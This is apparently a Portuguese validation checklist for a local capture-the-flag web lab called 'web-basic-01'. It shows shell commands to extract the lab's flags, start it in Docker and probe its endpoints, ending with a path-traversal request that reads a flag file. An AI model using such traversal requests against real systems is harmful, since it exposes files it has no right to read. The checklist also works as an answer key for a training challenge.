# Validacao do Release Candidate

Comandos esperados para validar o `web-basic-01`.

```bash
cd ~/ctf-labs
grep -Rho "FLAG{[^}]*}" web-basic-01 | sort -u
```

```bash
cd ~/ctf-labs/web-basic-01
sudo docker compose up --build
```

```bash
curl -i http://localhost:8088
curl -i http://localhost:8088/status
curl -i http://localhost:8088/robots.txt
curl -i http://localhost:8088/dev.txt
curl -i "http://localhost:8088/download?file=public-info.txt"
curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
```
